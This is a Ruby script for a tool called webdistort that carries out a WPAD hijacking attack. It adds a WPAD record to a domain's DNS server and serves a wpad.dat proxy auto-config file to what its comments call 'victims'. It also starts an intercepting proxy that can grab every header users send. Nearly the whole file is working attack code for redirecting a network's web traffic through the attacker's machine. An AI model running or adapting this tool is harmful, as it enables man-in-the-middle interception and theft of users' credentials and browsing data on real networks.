#!/usr/bin/ruby
#

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"

# define custom classes
require "distort_dns"
require "proxy"


=begin
	Start web server to serve wpad.dat & other documents to victims.
=end
def start_http(http_port, http_root, data_dir)
  http_logger = WEBrick::Log.new(data_dir + "/http.log")
  access_log_file = File.open(data_dir + "/http_access.log", "a")
  access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
  
	system_mime_table = WEBrick::HTTPUtils::DefaultMimeTypes
	user_mime_table = system_mime_table.update(
		{ "dat" => "application/x-ns-proxy-autoconfig" })

	server = WEBrick::HTTPServer.new(
    :Logger => http_logger,
    :AccessLog => access_logger,
		:MimeTypes => user_mime_table,
		:Port => http_port, 
		:DocumentRoot => http_root)

  ['INT', 'TERM', 'KILL'].each {|signal|
    trap(signal) { server.shutdown ; access_log_file.close }
  }
	server.start
end



def get_ip_address
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	
	ipAddr = ''

	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		ipAddr = s.addr.last
	end
	ensure
		Socket.do_not_reverse_lookup = orig

	return ipAddr
end

options = {
	"proxy_ip" => get_ip_address,
	"proxy_port" => 8080,
	"http_port" => 80,
	"http_root" => Dir::pwd + "/webdistort_htdocs",
	"data_dir" => Dir::pwd + "/saved"
}
usage = ''

opts = OptionParser.new do |opts|
	opts.banner = "Usage: webdistort.rb [options]"

	opts.separator ""
	opts.separator "Required:"
	opts.on("-d <domain>", String, "Domain to create wpad entry on") do |d|
		options["domain"] = d
	end

	opts.on("-p <primary dns address>", String, "Primary DNS Server address") do |p|
		options["primary_dns"] = p
	end
	opts.separator ""
	opts.separator "Optional:"
	opts.on("-i <ip address>", String, "Specify IP Address to run servers on, otherwise autodetect" ) do |i|
		options["proxy_ip"] = i
	end
	opts.on("-x <port>", "--proxy-port", "Specify port for proxy to bind") do |proxy_port|
		options["proxy_port"] = proxy_port
	end
	opts.on("-w <port>", "--http-port", "Specify port for http server to bind") do |http_port|
		options["http_port"] = http_port
  end
  opts.on("-g", "Grab all sent headers") do
    options["grab_headers"] = true
  end
	opts.on_tail("-h", "Print this help") do
		puts opts
		exit
	end
	usage = opts
end.parse!

if options["domain"] == nil || options["primary_dns"] == nil
	puts usage
	exit
end

#setup_files

#fork do
#	puts "Proxy PID: #$$"
#	start_proxy(options["proxy_port"], options["data_dir"], options["grab_headers"])
#end

#fork do
#	puts "HTTP PID: #$$"
#	start_http(options["http_port"], options["http_root"], options["data_dir"])
#end

#setup_files options["http_root"], options["proxy_port"], options["proxy_ip"], options["http_port"]

dns = WebDistort::DNS.new(options['domain'], options['primary_dns'], options['proxy_ip'])
proxy = WebDistort::Proxy.new(options)

dns.update
